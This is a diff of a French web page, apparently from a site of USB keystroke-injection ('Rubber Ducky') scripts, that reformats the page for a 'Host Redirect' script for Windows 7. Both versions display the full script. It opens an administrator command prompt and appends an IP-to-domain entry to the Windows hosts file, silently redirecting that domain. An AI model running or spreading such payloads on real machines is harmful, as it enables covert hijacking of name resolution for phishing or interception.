@@ -97,22 +97,45 @@
   <!--Main layout-->
   <main class="mt-5 pt-5">
     <div class="container animated fadeIn">
-      
-      <h3 class="ducky-blue-text pb-4">Host Redirect</h3>
 
-      <div>
+      <h1 class="my-4 ducky-blue-text">
+        <strong>Script - Host Redirect</strong>
+      </h1>
+
+      <hr class="my-5" />
+
+
+      <!-- Description -->
+      <div class="py-4 ducky-blue-text">
+        <h3 class=" pb-4">
+          <strong>Redirige des liens vers d'autres adresses.</strong>
+        </h3>
+
         <div class="py-4">
-          <h4 class="ducky-blue-text">Système(s) d'exploitation :</h4>
-          <p class="ducky-blue-text"><i class="fab fa-windows"></i> Windows 7</p>
+          <h4>
+            <strong>Système(s) d'exploitation :</strong>
+          </h4>
+
+          <p class="px-3">
+            <i class="fab fa-windows"></i>
+            <strong>
+               Windows 7
+            </strong>
+          </p>
+        </div>
+
+        <div>
+          <h4>
+            <strong>Fonctionnalités :</strong>
+          </h4>
+
+          <p class="px-3">Redirige les liens vers un hôte, par exemple un portail d'entreprise.</p>
         </div>
 
         <div class="py-4">
-          <h4 class="ducky-blue-text">Fonctionnalités :</h4>
-          <p class="ducky-blue-text">Redirige les liens vers un hôte, par exemple un portail d'entreprise.</p>
-        </div>
-
-        <div class="py-4">
-          <h4 class="ducky-blue-text">Déroulement du script :</h4>
+          <h4>
+            <strong>Déroulement du script :</strong>
+          </h4>
 
           <ol>
             <li class="ducky-blue-text">Ouverture de l'invité de commande</li>
@@ -126,30 +149,36 @@
             <button type="button" class="btn btn-primary ducky-blue rounded">Télécharger</button>
           </a>
         </div>
-
-        <div class="py-4">
-          <h4 class="ducky-blue-text">Le script :</h4>
-
-          <pre class="line-numbers mdb-color darken-3"><code>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 3000</span>
-            <span class="new-line blue-text">ESC</span>
-            <span class="new-line blue-text">CTRL ESC</span>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 400</span>
-            <span class="new-line white-text"><span class="cyan-text">STRING</span> cmd</span>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 400</span>
-            <span class="new-line blue-text">CTRL SHIFT ENTER</span>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 400</span>
-            <span class="new-line white-text"><span class="cyan-text">STRING</span> cd C:\Windows\System32\drivers\etc\</span>
-            <span class="new-line blue-text">ENTER</span>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 400</span>
-            <span class="new-line white-text"><span class="cyan-text">STRING</span> echo 64.149.122.94 www.test.com>>hosts</span>
-            <span class="new-line blue-text">ENTER</span>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 400</span>
-            <span class="new-line blue-text">ALT SPACE</span>
-            <span class="new-line white-text"><span class="cyan-text">STRING</span> c</span>
-          </code></pre>
-        </div>
       </div>
+      <!-- Description -->
+
+
+      <!-- Script affiché -->
+      <div class="py-4">
+        <h4 class="ducky-blue-text">
+          <strong>Le script :</strong>
+        </h4>
+
+        <pre class="line-numbers mdb-color darken-3"><code>
+          <span class="new-line white-text"><span class="orange-text">DELAY</span> 3000</span>
+          <span class="new-line blue-text">ESC</span>
+          <span class="new-line blue-text">CTRL ESC</span>
+          <span class="new-line white-text"><span class="orange-text">DELAY</span> 400</span>
+          <span class="new-line white-text"><span class="cyan-text">STRING</span> cmd</span>
+          <span class="new-line white-text"><span class="orange-text">DELAY</span> 400</span>
+          <span class="new-line blue-text">CTRL SHIFT ENTER</span>
+          <span class="new-line white-text"><span class="orange-text">DELAY</span> 400</span>
+          <span class="new-line white-text"><span class="cyan-text">STRING</span> cd C:\Windows\System32\drivers\etc\</span>
+          <span class="new-line blue-text">ENTER</span>
+          <span class="new-line white-text"><span class="orange-text">DELAY</span> 400</span>
+          <span class="new-line white-text"><span class="cyan-text">STRING</span> echo 64.149.122.94 www.test.com>>hosts</span>
+          <span class="new-line blue-text">ENTER</span>
+          <span class="new-line white-text"><span class="orange-text">DELAY</span> 400</span>
+          <span class="new-line blue-text">ALT SPACE</span>
+          <span class="new-line white-text"><span class="cyan-text">STRING</span> c</span>
+        </code></pre>
+      </div>
+      <!-- Script affiché -->
     </div>
   </main>
   <!--Main layout-->
